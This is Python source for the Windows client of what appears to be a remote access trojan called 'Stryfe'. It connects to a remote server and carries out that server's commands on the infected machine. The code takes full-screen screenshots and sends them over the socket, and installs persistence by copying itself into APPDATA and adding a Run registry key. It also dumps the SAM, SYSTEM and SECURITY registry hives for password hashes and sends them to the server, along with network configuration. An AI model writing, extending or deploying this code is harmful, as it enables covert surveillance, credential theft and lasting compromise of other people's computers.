import platform
import sys, os, subprocess
import secrets
import shutil, mss, mss.tools

if platform.system() == 'Windows':
    import winreg

from client import Client
from symbols import *

class WindowsClient(Client):
    def __init__(self, server_address, server_port):
        super().__init__(server_address, server_port)

    def screenshot(self, args):
        appdata = os.getenv('APPDATA')
        screen_path = os.path.join(appdata, f"{secrets.token_hex(5)}.jpg")

        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[0])
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)

        with open(screen_path, 'rb') as f:
            while (chunk := f.read(4096)):
                self.secure_sock.sendall(chunk)
        self.secure_sock.sendall(SIG_EOF)
        os.remove(screen_path)

    def persistence(self):
        self.agent_path = os.path.join(os.getenv('APPDATA'), f"{self.uid}.exe")

        # Check if Persistence is already in place
        if os.path.exists(self.agent_path):
            return 0

        try:
            shutil.copy2(sys.argv[0], self.agent_path)

        except Exception as e:
            return 1

        # Add the exe to startup programs
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Stryfe", 0, winreg.REG_SZ, self.agent_path)
        winreg.CloseKey(key)

    def send_file(self, path):
        # if it exists
        if os.access(path, os.F_OK):
            # if user has permissions to read the file
            if os.access(path, os.R_OK):
                try:
                    with open(path, 'rb') as f:
                        while (chunk := f.read(4096)):
                            self.secure_sock.sendall(chunk)
                    self.secure_sock.sendall(SIG_EOF)
                except Exception as e:
                    print("Error while sending file: ", e)
                    self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
            else:
                # Sending error code if user doesnt have permissions to dump hashes
                self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)
            self.secure_sock.sendall(SIG_EOF)
        else:
            self.secure_sock.sendall(FILE_NOT_FOUND)

    def delete_file(self, filepath):
        try:
            os.remove(filepath)
        except Exception as e:
            pass

    def hashdump(self, args):
        print("In hashdump windows client")
        base_path = os.path.join('C:', 'Windows', 'Temp')
        sam_path = os.path.join(base_path, 'sam')
        system_path = os.path.join(base_path, 'system')
        security_path = os.path.join(base_path, 'security')

        # Delete files if they exist to avoid entering in interactive mode
        self.delete_file(sam_path)
        subprocess.run("reg save HKLM\\SAM %s" % sam_path, shell=True)
        self.delete_file(system_path)
        subprocess.run("reg save HKLM\\SYSTEM %s" % system_path, shell=True)
        self.delete_file(security_path)
        subprocess.run("reg save HKLM\\SECURITY %s" % security_path, shell=True)

        print(f"Sending file {sam_path}")
        self.send_file(sam_path)
        print(f"Sending file {system_path}")
        self.send_file(system_path)
        print(f"Sending file {security_path}")
        self.send_file(security_path)

    def ipconfig(self, args):
        output = subprocess.check_output("ipconfig /all", shell=True, text=True, encoding='utf-8', errors='ignore')
        self.secure_sock.sendall(output.encode())